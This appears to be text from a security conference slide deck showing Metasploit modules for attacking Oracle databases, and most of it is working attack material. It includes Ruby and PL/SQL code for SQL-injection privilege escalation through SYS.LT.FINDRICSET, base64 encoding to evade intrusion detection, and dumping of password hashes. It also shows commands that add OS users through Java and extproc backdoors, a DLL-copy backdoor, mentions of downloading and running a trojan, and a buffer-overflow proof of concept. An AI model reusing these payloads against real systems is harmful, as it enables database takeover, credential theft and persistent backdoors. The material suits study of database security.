'References'     =>[ [ 'BID', '26098' ],],
'DisclosureDate' => 'Oct 17 2007'))‏
register_options( [
OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to 
#{datastore['DBUSER']}"]),], self.class)‏
Privilege Escalation
The code.
name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)‏
function = 
"CREATE OR REPLACE FUNCTION #{name} RETURN NUMBER
AUTHID CURRENT_USER AS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE '#{datastore['SQL'].upcase}'; COMMIT;
RETURN(0);
END;"
Privilege Escalation
The code.
package ="BEGIN 
SYS.LT.FINDRICSET('.'' #{datastore ['DBUSER']}.#{name}||'''')--',''); 
END;"
clean = "DROP FUNCTION #{name}"
....
print_status("Sending first function...")‏
prepare_exec(function)‏
print_status("Attempting sql injection on SYS.LT.FINDRICSET...")‏
prepare_exec(package)‏
print_status("Removing function '#{name}'...")‏
prepare_exec(clean)‏
....
Privilege Escalation
The set-up.
msf auxiliary(lt_findricset) > set RHOST 172.10.1.109
RHOST => 172.10.1.109
msf auxiliary(lt_findricset) > set RPORT 1521
RPORT => 1521
msf auxiliary(lt_findricset) > set DBUSER SCOTT
DBUSER => SCOTT
msf auxiliary(lt_findricset) > set DBPASS TIGER
DBPASS => TIGER
msf auxiliary(lt_findricset) > set SID ORCL
SID => ORACLE
msf auxiliary(lt_findricset) > set SQL GRANT DBA TO SCOTT
SQL => GRANT DBA TO SCOTT
Privilege Escalation
Attacking SYS.LT.FINDRICSET.
msf auxiliary(lt_findricset) > set SQL "grant dba to scott"
SQL => grant dba to scott
msf auxiliary(lt_findricset) > run
[*] Sending first function...
[*] Done...
[*] Attempting sql injection on SYS.LT.FINDRICSET...
[*] Done...
[*] Removing function 'NBVFICZ'...
[*] Done...
[*] Auxiliary module execution completed
msf auxiliary(lt_findricset) > 
Privilege Escalation
Success?
Before Injection.
SQL => select * from user_role_privs
msf auxiliary(sql) > run
[*] Sending SQL... 
[*] SCOTT,CONNECT,NO,YES,NO 
[*] SCOTT,RESOURCE,NO,YES,NO 
After Injection.
msf auxiliary(sql) > run 
[*] Sending SQL... 
[*] SCOTT,CONNECT,NO,YES,NO 
[*] SCOTT,DBA,NO,YES,NO
[*] SCOTT,RESOURCE,NO,YES,NO 
Privilege Escalation
Which works, but...
Privilege Escalation
This Can Be Solved By Implementing Some 
Basic Evasion.
Which Is Then Decoded On The Remote Side.
DECLARE
#{rand2} VARCHAR2(32767);
BEGIN
#{rand2} :=
utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
EXECUTE IMMEDIATE #{rand2}; END;
dos = Rex::Text.encode_base64(package)‏
Privilege Escalation
We Bypass The NIDS, But Not So Much The HIPS
Privilege Escalation
At least not with that exploit!
"select sys.dbms_metadata.get_xml('''||#{datastore['DBUSER']}.#{name}()||''','') from dual"
Privilege Escalation Exploits
Coverage.
lt_findricset.rb
lt_findricset_cursor.rb
dbms_metadata_open.rb
dbms_cdc_ipublish.rb
dbms_cdc_publish.rb
lt_compressworkspace.rb
lt_mergeworkspace.rb
lt_removeworkspace.rb
lt_rollbackworkspace.rb
Oracle Attack Methodology
Locate a system running Oracle.
Determine Oracle Version.
Determine Oracle SID.
Guess/Bruteforce USER/PASS.
Privilege Escalation via SQL Injection.
Manipulate Data/Post Exploitation.
Cover Tracks.
Post Exploitation
If all I want is the Data after SQLI to DBA we are 
probably done.
sql.rb to run SQL commands.
msf auxiliary(sql) > set SQL "select username,password,account_status from 
dba_users”
SQL => select username,password,account_status from dba_users
msf auxiliary(sql) > run
[*] Sending SQL...
[*] SYS,7087B7E95718C0CC,OPEN
[*] SYSTEM,66DC0F914CDD83F3,OPEN
[*] DBSNMP,E066D214D5421CCC,OPEN
[*] SCOTT,F894844C34402B67,OPEN
[*] Done...
[*] Auxiliary module execution completed
msf auxiliary(sql) > 
Post Exploitation
Data is nice, but shells are better 
Several published methods for running OS 
commands via oracle libraries.
Via Java.
Extproc backdoors.
Dbms_Scheduler.
Run custom pl/sql or java
Post Exploitation
Win32Exec
Grant user JAVASYSPRIVS using sql.rb.
Run win32exec.rb to run system commands.
Examples
Net User Add
TFTP get trojan.exe → execute trojan.exe
FTP Batch Scripts
Net User Add → metasploit psexec exploit
Post Exploitation
Win32Exec
msf auxiliary(win32exec) > set CMD "net user dba P@ssW0rd1234 /add“
CMD => net user dba P@ssW0rd1234 /add
msf auxiliary(win32exec) > run
[*] Creating MSF JAVA class...
[*] Done...
[*] Creating MSF procedure...
[*] Done...
[*] Sending command: 'net user dba P@ssW0rd1234 /add‘
[*] Done...
[*] Auxiliary module execution completed 
Post Exploitation
FTP Upload
Echo over FTP batch script via UTL_FILE, use 
DBMS_Scheduler to run the script and execute the 
malware.
Demo Video at:
http://vimeo.com/2704188
Post Exploitation
Perl Backdoor
Oracle installs perl with every install.
Use UTL_FILE to echo over perl shell line by line.
Use one of the other tools to execute perl shell.
Easy to use with *nix
Post Exploitation
Extproc Backdoor via directory traversal.
 Allows you to call libraries outside of 
oracle root.
Nix and win32.
CVE 2004-1364
9.0.1.1 – 9.0.1.5 
9.2.0.1 – 9.2.0.5
10.1.0.2
Post Exploitation
Extproc Backdoor via directory traversal.
msf auxiliary(extproc_backdoor_traversal) > set CMD “net user metasploit 
metasploit /add”
CMD => net user metasploit metasploit /add
msf auxiliary(extproc_backdoor_traversal) > run
[*] Setting up extra required permissions
[*] Done...
[*] Set msvcrt.dll location to 
C:\oracle\ora92\bin\../../../Windows\system32\msvcrt.dll
[*] Done...
[*] Setting extproc backdoor
[*] Running command net user metasploit metasploit /add
[*] Done…
[*] Auxiliary  module execution complete
Post Exploitation
Extproc Backdoor via directory traversal.
Post Exploitation
Extproc Backdoor via copy dll.
“newer” versions will allow you to just copy over 
the dll into the %ORACLE_HOME%\bin directory.
CREATE OR REPLACE DIRECTORY copy_dll_from AS 
'C:\Windows\system32'; 
CREATE OR REPLACE DIRECTORY copy_dll_to AS 
'C:\Oracle\product\10.1.0\db_1\BIN'; 
…
CREATE OR REPLACE LIBRARY extproc_shell AS 
'C:\Oracle\product\10.1.0\db_1\bin\msvcrt.dll'; / 
Works on newer Oracle 10g/11g.
http://milw0rm.org/exploits/7675
Post Exploitation
Oracle NTLM Stealer
Oracle running as admin user not SYSTEM.
Have Oracle connect back to MSF, grab halfLM 
challenge or perform SMB Relay attack.
Module writers did a great write up on using the 
module and when it would be useful.
http://www.dsecrg.com/files/pub/pdf/Penetration_from_application
_down_to_OS_(Oracle%20database).pdf 
Breaking Other Oracle Apps
Oracle Application Server CGI/Vulnerable URL 
scanner
oas_cgi.rb
msf auxiliary(oas_cgi) > run
[*] /em/console/logon/logon
[*] /em/dynamicImage/emSDK/chart/EmChartBean
[*] /servlet/DMSDump
[*]/servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-
INF/config/soapConfig.xml
[*] /servlet/Spy
[*] Auxiliary module execution completed 
The Way Ahead
Exploits For Vulnerable Packages.
[*] ORA-03135: connection lost contact 
PROCEDURE DELETE_REFRESH_OPERATIONS
Argument Name
Type
In/Out Default?
------------------------------
-----------------------
------
--------
SNAP_OWNER
VARCHAR2
IN
SNAP_NAME    
VARCHAR2
IN
sploit = rand_text_alpha_upper(576) + "BBBB" + "AAAA" + "\xcc" * 500
sql = %Q|BEGIN
SYS.DBMS_SNAP_INTERNAL.DELETE_REFRESH_OPERATIONS('MSF', '#{sploit}');
END;
|
0:032> !exchain
074fc408: 41414141
Invalid exception stack at 42424242
THANKS!
Questions?
THANKS!
HDM, Richard Evans, JMG, !LSO, Sh2kerr, Rory McCune